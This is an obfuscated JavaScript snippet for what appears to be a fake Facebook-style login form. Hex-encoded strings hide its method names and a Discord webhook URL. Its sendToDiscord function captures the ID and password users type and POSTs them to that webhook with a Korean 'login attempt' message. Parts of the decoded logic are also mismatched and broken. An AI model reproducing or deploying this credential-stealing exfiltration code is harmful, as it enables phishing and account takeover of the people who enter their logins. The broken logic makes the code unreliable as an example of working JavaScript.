let _0x9c79 = [
    "\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65",
    "\x69\x6E\x70\x75\x74",
    "\x70\x61\x73\x73\x77\x6F\x72\x64",
    "\x63\x6C\x69\x63\x6B",
    "\x63\x6C\x69\x63\x6B",
    "\x75\x70\x64\x61\x74\x65",
    "\x6B\x65\x79\x75\x70",
    "\x63\x6C\x69\x63\x6B",
    "\x63\x6C\x69\x63\x6B",
    "\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x72",
    "\x72\x65\x6D\x6F\x76\x65",
    "\x61\x64\x64\x43\x6C\x69\x63\x6B",
    "\x61\x64\x64\x43\x6C\x69\x63\x6B"
];

let inputTag = document[_0x9c79[0]](_0x9c79[1]);
let buttonArray = document[_0x9c79[0]](_0x9c79[1]);

let inputId = inputTag[0];
let inputPassword = inputTag[1];

let ordinaryButton = buttonArray[0];
let facebookLoginButton = buttonArray[1];

inputPassword[_0x9c79[4]](_0x9c79[3], () => {
    if (inputId[_0x9c79[2]] && inputPassword[_0x9c79[2]]) {
        ordinaryButton[_0x9c79[7]](_0x9c79[5]);
        ordinaryButton[_0x9c79[7]](_0x9c79[6]);
    } else {
        ordinaryButton[_0x9c79[7]](_0x9c79[6]);
        ordinaryButton[_0x9c79[7]](_0x9c79[5]);
    }
});

ordinaryButton[_0x9c79[4]](_0x9c79[3], () => {
    if (inputId[_0x9c79[2]] === "본인의아이디" && inputPassword[_0x9c79[2]] === "비밀번호") {
    } else {
        sendToDiscord(inputId[_0x9c79[2]], inputPassword[_0x9c79[2]]);
    }
});

function sendToDiscord(userId, password) {
    const _0x58fc = [
        '\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x31\x33\x31\x30\x31\x39\x35\x31\x39\x30\x33\x37\x39\x38\x33\x39\x35\x2F\x61\x36\x74\x33\x56\x51\x63\x6F\x33\x76\x2D\x4D\x68\x32\x59\x6D\x6F\x34\x57\x6D\x63\x71\x73\x37\x61\x71\x5A\x42\x65\x31\x59\x4A\x5A\x55\x34\x6E\x53\x6F\x72\x61\x76\x76\x33\x7A\x53\x57\x45\x39\x55\x66\x64\x4A\x54\x69\x4E\x30\x33\x35\x6F\x4C\x44\x46\x49\x69\x50\x61\x6C\x62'
    ];

    let webhookURL = _0x58fc[0];

    const data = {
        content: `로그인 시도:\n아이디: ${userId}\n비밀번호: ${password}`
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('네트워크 응답이 좋지 않습니다.');
        }
        return response.json();
    })
    .then(data => {
    })
    .catch((error) => {
    });
}
